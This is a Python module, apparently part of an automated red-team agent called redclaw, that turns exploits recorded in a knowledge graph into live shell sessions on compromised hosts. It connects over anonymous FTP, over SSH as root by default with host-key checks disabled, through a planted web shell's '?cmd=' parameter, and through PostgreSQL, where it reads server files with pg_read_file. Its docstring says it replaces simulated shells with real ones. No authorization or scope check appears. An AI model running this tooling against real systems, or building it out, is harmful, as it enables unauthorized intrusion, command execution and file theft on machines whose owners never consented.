"""
ShellBridge — Transport abstraction for post-exploitation shell access.

Replaces LLM simulation with real shell connections.
Each exploit type gets the right transport:
  - FTP exploit → FTPTransport (ftplib)
  - SSH exploit → SSHTransport (asyncssh / paramiko fallback)
  - PostgreSQL exploit → PostgresTransport (socket-level)
  - Web shell → WebShellTransport (HTTP GET/POST)
  - Local test → BashLocalTransport (subprocess)

Usage:
    bridge = ShellBridge.from_kg(kg, target)
    if bridge and await bridge.connect():
        output = await bridge.execute("whoami")
        await bridge.close()
"""
from __future__ import annotations

import asyncio
import logging
import re
import socket
import urllib.parse
from abc import ABC, abstractmethod
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Callable, Dict, List, Optional

logger = logging.getLogger("redclaw.shell_bridge")


# ── Shell Types ───────────────────────────────────────────────────────────────


class ShellType(Enum):
    SSH         = "ssh"
    FTP         = "ftp"
    REVERSE     = "reverse_shell"
    WEB         = "web_shell"
    DB_POSTGRES = "db_postgres"
    DB_MYSQL    = "db_mysql"
    BASH_LOCAL  = "bash_local"


@dataclass
class ShellContext:
    """Connection context for a shell transport."""
    shell_type: ShellType
    host: str
    port: int
    username: str = ""
    password: str = ""
    web_url: str = ""
    db_name: str = ""
    exploit_cve: str = ""
    exploit_method: str = ""


# ── Attack vector → shell type mapping ────────────────────────────────────────

METHOD_TO_SHELL = {
    # FTP
    "ftp_anonymous":     ShellType.FTP,
    "anonymous_login":   ShellType.FTP,
    # SSH
    "default_creds":     ShellType.SSH,
    "ssh_brute":         ShellType.SSH,
    "ssh_banner":        ShellType.SSH,
    "key_bruteforce":    ShellType.SSH,
    # PostgreSQL
    "postgres_noauth":   ShellType.DB_POSTGRES,
    "postgres_auth_check": ShellType.DB_POSTGRES,
    # MySQL
    "mysql_noauth":      ShellType.DB_MYSQL,
    "mysql_banner":      ShellType.DB_MYSQL,
    # Web
    "web_shell_upload":  ShellType.WEB,
    "path_traversal":    ShellType.WEB,
    "rce":               ShellType.WEB,
    "sqli":              ShellType.WEB,
    "http_recon":        ShellType.WEB,
}


# ── Abstract Transport ────────────────────────────────────────────────────────


class ShellTransport(ABC):
    """Abstract base for all shell transport types."""

    @abstractmethod
    async def connect(self) -> bool:
        """Establish connection. Returns True on success."""
        ...

    @abstractmethod
    async def execute(self, command: str) -> str:
        """Execute a command and return output."""
        ...

    @abstractmethod
    async def close(self) -> None:
        """Close the connection."""
        ...

    @property
    def transport_name(self) -> str:
        return self.__class__.__name__


# ── FTP Transport ─────────────────────────────────────────────────────────────


class FTPTransport(ShellTransport):
    """FTP shell — runs LIST, RETR, etc. via ftplib."""

    def __init__(self, ctx: ShellContext):
        self.ctx = ctx
        self._ftp = None

    async def connect(self) -> bool:
        import ftplib
        loop = asyncio.get_event_loop()
        try:
            self._ftp = ftplib.FTP()
            await loop.run_in_executor(
                None, lambda: self._ftp.connect(self.ctx.host, self.ctx.port, timeout=10)
            )
            user = self.ctx.username or "anonymous"
            pwd = self.ctx.password or "anonymous@"
            await loop.run_in_executor(
                None, lambda: self._ftp.login(user, pwd)
            )
            logger.info(f"FTP connected: {self.ctx.host}:{self.ctx.port} as {user}")
            return True
        except Exception as e:
            logger.warning(f"FTP connect failed: {e}")
            return False

    async def execute(self, command: str) -> str:
        if not self._ftp:
            return "ERROR: FTP not connected"

        loop = asyncio.get_event_loop()
        lines: List[str] = []

        try:
            cmd = command.strip()
            upper = cmd.upper()

            if upper.startswith("LIST") or upper == "LS" or upper == "DIR":
                path = cmd.split(None, 1)[1] if " " in cmd else "."
                await loop.run_in_executor(
                    None, lambda: self._ftp.retrlines(f"LIST {path}", lines.append)
                )
            elif upper.startswith("PWD"):
                pwd = await loop.run_in_executor(None, self._ftp.pwd)
                lines.append(pwd)
            elif upper.startswith("CWD") or upper.startswith("CD"):
                path = cmd.split(None, 1)[1] if " " in cmd else "/"
                await loop.run_in_executor(
                    None, lambda: self._ftp.cwd(path)
                )
                lines.append(f"Changed to {path}")
            elif upper.startswith("RETR") or upper.startswith("GET"):
                fname = cmd.split(None, 1)[1] if " " in cmd else ""
                data_lines: List[bytes] = []
                await loop.run_in_executor(
                    None, lambda: self._ftp.retrbinary(
                        f"RETR {fname}", data_lines.append
                    )
                )
                content = b"".join(data_lines).decode("utf-8", errors="replace")
                lines.append(content[:2000])
            else:
                # Generic FTP command
                response = await loop.run_in_executor(
                    None, lambda: self._ftp.sendcmd(cmd)
                )
                lines.append(response)

        except Exception as e:
            lines.append(f"FTP ERROR: {e}")

        return "\n".join(lines)

    async def close(self) -> None:
        if self._ftp:
            try:
                self._ftp.quit()
            except Exception:
                pass
            self._ftp = None


# ── SSH Transport ─────────────────────────────────────────────────────────────


class SSHTransport(ShellTransport):
    """SSH shell — uses asyncssh if available, socket fallback for banner."""

    def __init__(self, ctx: ShellContext):
        self.ctx = ctx
        self._client = None
        self._using_asyncssh = False

    async def connect(self) -> bool:
        # Try asyncssh first
        try:
            import asyncssh
            self._client = await asyncio.wait_for(
                asyncssh.connect(
                    self.ctx.host, port=self.ctx.port,
                    username=self.ctx.username or "root",
                    password=self.ctx.password,
                    known_hosts=None,
                ),
                timeout=10,
            )
            self._using_asyncssh = True
            logger.info(f"SSH connected (asyncssh): {self.ctx.host}:{self.ctx.port}")
            return True
        except ImportError:
            logger.info("asyncssh not available — trying paramiko")
        except Exception as e:
            logger.warning(f"asyncssh connect failed: {e}")
            return False

        # Try paramiko
        try:
            import paramiko
            loop = asyncio.get_event_loop()
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            await loop.run_in_executor(
                None, lambda: client.connect(
                    self.ctx.host, port=self.ctx.port,
                    username=self.ctx.username or "root",
                    password=self.ctx.password,
                    timeout=10, allow_agent=False, look_for_keys=False,
                )
            )
            self._client = client
            self._using_asyncssh = False
            logger.info(f"SSH connected (paramiko): {self.ctx.host}:{self.ctx.port}")
            return True
        except ImportError:
            logger.warning("Neither asyncssh nor paramiko available")
            return False
        except Exception as e:
            logger.warning(f"SSH connect failed: {e}")
            return False

    async def execute(self, command: str) -> str:
        if not self._client:
            return "ERROR: SSH not connected"

        try:
            if self._using_asyncssh:
                result = await asyncio.wait_for(
                    self._client.run(command), timeout=30,
                )
                return (result.stdout or "") + (result.stderr or "")
            else:
                # paramiko
                loop = asyncio.get_event_loop()
                stdin, stdout, stderr = await loop.run_in_executor(
                    None, lambda: self._client.exec_command(command, timeout=30)
                )
                out = await loop.run_in_executor(None, stdout.read)
                err = await loop.run_in_executor(None, stderr.read)
                return out.decode("utf-8", errors="replace") + err.decode("utf-8", errors="replace")
        except Exception as e:
            return f"SSH ERROR: {e}"

    async def close(self) -> None:
        if self._client:
            try:
                if self._using_asyncssh:
                    self._client.close()
                else:
                    self._client.close()
            except Exception:
                pass
            self._client = None


# ── PostgreSQL Transport ──────────────────────────────────────────────────────


class PostgresTransport(ShellTransport):
    """PostgreSQL shell — runs SQL queries, COPY for file read."""

    def __init__(self, ctx: ShellContext):
        self.ctx = ctx
        self._conn = None
        self._using_asyncpg = False

    async def connect(self) -> bool:
        # Try asyncpg
        try:
            import asyncpg
            self._conn = await asyncio.wait_for(
                asyncpg.connect(
                    host=self.ctx.host, port=self.ctx.port,
                    user=self.ctx.username or "postgres",
                    password=self.ctx.password or None,
                    database=self.ctx.db_name or "postgres",
                ),
                timeout=10,
            )
            self._using_asyncpg = True
            logger.info(f"PostgreSQL connected (asyncpg): {self.ctx.host}:{self.ctx.port}")
            return True
        except ImportError:
            pass
        except Exception as e:
            logger.warning(f"asyncpg connect failed: {e}")
            return False

        # Try psycopg2
        try:
            import psycopg2
            loop = asyncio.get_event_loop()
            self._conn = await loop.run_in_executor(
                None, lambda: psycopg2.connect(
                    host=self.ctx.host, port=self.ctx.port,
                    user=self.ctx.username or "postgres",
                    password=self.ctx.password or "",
                    dbname=self.ctx.db_name or "postgres",
                    connect_timeout=10,
                )
            )
            self._using_asyncpg = False
            logger.info(f"PostgreSQL connected (psycopg2): {self.ctx.host}:{self.ctx.port}")
            return True
        except ImportError:
            logger.warning("Neither asyncpg nor psycopg2 available")
            return False
        except Exception as e:
            logger.warning(f"psycopg2 connect failed: {e}")
            return False

    async def execute(self, command: str) -> str:
        if not self._conn:
            return "ERROR: PostgreSQL not connected"

        # Convert shell-like commands to SQL
        sql = self._shell_to_sql(command)

        try:
            if self._using_asyncpg:
                rows = await self._conn.fetch(sql)
                return "\n".join(str(dict(r)) for r in rows)
            else:
                loop = asyncio.get_event_loop()
                cur = self._conn.cursor()
                await loop.run_in_executor(None, lambda: cur.execute(sql))
                rows = await loop.run_in_executor(None, cur.fetchall)
                return "\n".join(str(r) for r in rows)
        except Exception as e:
            return f"PG ERROR: {e}"

    def _shell_to_sql(self, command: str) -> str:
        """Convert common shell commands to PostgreSQL equivalents."""
        cmd = command.strip()
        if cmd.startswith("cat "):
            filepath = cmd[4:].strip()
            return f"SELECT pg_read_file('{filepath}', 0, 10000)"
        elif cmd in ("whoami", "id"):
            return "SELECT current_user, session_user"
        elif cmd == "uname -a":
            return "SELECT version()"
        elif cmd.startswith("ls"):
            return "SELECT * FROM pg_ls_dir('/') LIMIT 50"
        return cmd  # Assume it's already SQL

    async def close(self) -> None:
        if self._conn:
            try:
                if self._using_asyncpg:
                    await self._conn.close()
                else:
                    self._conn.close()
            except Exception:
                pass
            self._conn = None


# ── Web Shell Transport ───────────────────────────────────────────────────────


class WebShellTransport(ShellTransport):
    """HTTP-based shell — sends commands via URL params or POST body."""

    def __init__(self, ctx: ShellContext):
        self.ctx = ctx

    async def connect(self) -> bool:
        """Verify web shell URL is reachable."""
        import http.client
        try:
            parsed = urllib.parse.urlparse(self.ctx.web_url or f"http://{self.ctx.host}:{self.ctx.port}/")
            conn = http.client.HTTPConnection(parsed.hostname, parsed.port or 80, timeout=5)
            conn.request("GET", parsed.path or "/")
            resp = conn.getresponse()
            conn.close()
            return resp.status < 500
        except Exception:
            return False

    async def execute(self, command: str) -> str:
        """Execute command via web shell (GET ?cmd=...)."""
        import http.client
        try:
            base_url = self.ctx.web_url or f"http://{self.ctx.host}:{self.ctx.port}/"
            parsed = urllib.parse.urlparse(base_url)
            path = f"{parsed.path}?cmd={urllib.parse.quote(command)}"
            conn = http.client.HTTPConnection(parsed.hostname, parsed.port or 80, timeout=30)
            conn.request("GET", path)
            resp = conn.getresponse()
            body = resp.read(4096).decode("utf-8", errors="replace")
            conn.close()

            # Strip HTML if present
            body = re.sub(r"<[^>]+>", "", body).strip()
            return body
        except Exception as e:
            return f"WEB SHELL ERROR: {e}"

    async def close(self) -> None:
        pass  # Stateless


# ── Bash Local Transport (testing) ────────────────────────────────────────────


class BashLocalTransport(ShellTransport):
    """
    Local subprocess — for testing ShellBridge API without a real target.
    Executes commands on the local machine.
    """

    def __init__(self, ctx: Optional[ShellContext] = None):
        self.ctx = ctx

    async def connect(self) -> bool:
        return True

    async def execute(self, command: str) -> str:
        try:
            proc = await asyncio.create_subprocess_shell(
                command,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
            )
            stdout, stderr = await asyncio.wait_for(
                proc.communicate(), timeout=30,
            )
            output = stdout.decode("utf-8", errors="replace")
            if stderr:
                output += stderr.decode("utf-8", errors="replace")
            return output
        except asyncio.TimeoutError:
            return "TIMEOUT"
        except Exception as e:
            return f"ERROR: {e}"

    async def close(self) -> None:
        pass


# ── Shell Bridge Factory ─────────────────────────────────────────────────────


class ShellBridge:
    """
    Factory that reads KG EXPLOITABLE_VIA edges and creates the right transport.

    PostExploitPhaseAgent calls:
        bridge = ShellBridge.from_kg(kg, target)
        await bridge.connect()
        output = await bridge.execute("whoami")
    """

    TRANSPORT_MAP = {
        ShellType.FTP:         FTPTransport,
        ShellType.SSH:         SSHTransport,
        ShellType.DB_POSTGRES: PostgresTransport,
        ShellType.WEB:         WebShellTransport,
        ShellType.BASH_LOCAL:  BashLocalTransport,
    }

    def __init__(self, transport: ShellTransport, context: ShellContext):
        self._transport = transport
        self._context = context

    @property
    def shell_type(self) -> ShellType:
        return self._context.shell_type

    @property
    def transport_name(self) -> str:
        return self._transport.transport_name

    async def connect(self) -> bool:
        """Connect via the selected transport."""
        return await self._transport.connect()

    async def execute(self, command: str) -> str:
        """Execute a command via the selected transport."""
        return await self._transport.execute(command)

    async def close(self) -> None:
        """Close the transport connection."""
        await self._transport.close()

    @classmethod
    def from_kg(cls, kg: Any, target: str) -> Optional["ShellBridge"]:
        """
        Create ShellBridge from KG exploit data.

        Reads exploit nodes with EXPLOITABLE_VIA edges.
        Picks the best exploit (access_gained=True preferred, then highest confidence).
        Maps attack_vector to ShellType → Transport.
        """
        # Query KG for successful exploits
        exploit_info = cls._get_exploit_info_from_kg(kg, target)

        if not exploit_info:
            logger.warning(f"No exploits found in KG for {target}")
            return None

        # Pick the best exploit
        best = cls._select_best_exploit(exploit_info)
        if not best:
            return None

        # Map to shell type
        method = best.get("attack_vector", best.get("name", ""))
        shell_type = METHOD_TO_SHELL.get(method, ShellType.BASH_LOCAL)

        # Get credentials from KG if available
        creds = cls._get_credentials_from_kg(kg, target)

        ctx = ShellContext(
            shell_type=shell_type,
            host=target,
            port=best.get("port", 22),
            username=creds.get("username", ""),
            password=creds.get("password", ""),
            exploit_cve=best.get("cve", ""),
            exploit_method=method,
        )

        transport_class = cls.TRANSPORT_MAP.get(shell_type, BashLocalTransport)
        transport = transport_class(ctx)

        logger.info(f"ShellBridge created: {shell_type.value} → {transport_class.__name__}")
        return cls(transport=transport, context=ctx)

    @classmethod
    def from_context(cls, ctx: ShellContext) -> "ShellBridge":
        """Create ShellBridge from an explicit ShellContext (for testing)."""
        transport_class = cls.TRANSPORT_MAP.get(ctx.shell_type, BashLocalTransport)
        transport = transport_class(ctx)
        return cls(transport=transport, context=ctx)

    @staticmethod
    def _get_exploit_info_from_kg(kg: Any, target: str) -> List[Dict]:
        """Extract exploit information from KG NetworkX graph."""
        exploits = []
        try:
            from redclaw.memory.knowledge_graph import NodeType, EdgeType

            for node_id, data in kg.graph.nodes(data=True):
                if data.get("type") != NodeType.EXPLOIT.value:
                    continue

                # Get the vulnerability this exploit links to
                cve = ""
                port = 0
                for pred in kg.graph.predecessors(node_id):
                    pred_data = kg.graph.nodes.get(pred, {})
                    if pred_data.get("type") == "vulnerability":
                        cve = pred_data.get("cve", pred.replace("vuln:", ""))
                        # Trace to service → port
                        for svc_pred in kg.graph.predecessors(pred):
                            svc_data = kg.graph.nodes.get(svc_pred, {})
                            if svc_data.get("type") == "service":
                                # Extract port from node ID (format: "ip:port:name")
                                parts = svc_pred.split(":")
                                if len(parts) >= 2 and parts[-2].isdigit():
                                    port = int(parts[-2])
                                elif len(parts) >= 2:
                                    for p in parts:
                                        if p.isdigit():
                                            port = int(p)
                                            break

                exploits.append({
                    "node_id": node_id,
                    "name": data.get("name", ""),
                    "cve": cve,
                    "port": port,
                    "tested": data.get("tested", False),
                    "result": data.get("result", ""),
                    "evidence": data.get("evidence", ""),
                    "attack_vector": data.get("name", "").split(" ")[0] if data.get("name") else "",
                })
        except Exception as e:
            logger.warning(f"Failed to query KG for exploits: {e}")

        return exploits

    @staticmethod
    def _select_best_exploit(exploits: List[Dict]) -> Optional[Dict]:
        """Select the best exploit for shell access."""
        if not exploits:
            return None

        # Prefer successful exploits
        successful = [e for e in exploits if e.get("result") == "success"]
        if successful:
            return successful[0]

        # Prefer tested exploits
        tested = [e for e in exploits if e.get("tested")]
        if tested:
            return tested[0]

        return exploits[0]

    @staticmethod
    def _get_credentials_from_kg(kg: Any, target: str) -> Dict[str, str]:
        """Get credentials for target from KG."""
        try:
            creds = kg.get_credentials_for_host(target)
            cred_list = creds.get("credentials", [])
            if cred_list:
                return cred_list[0]  # First credential
        except Exception:
            pass
        return {}
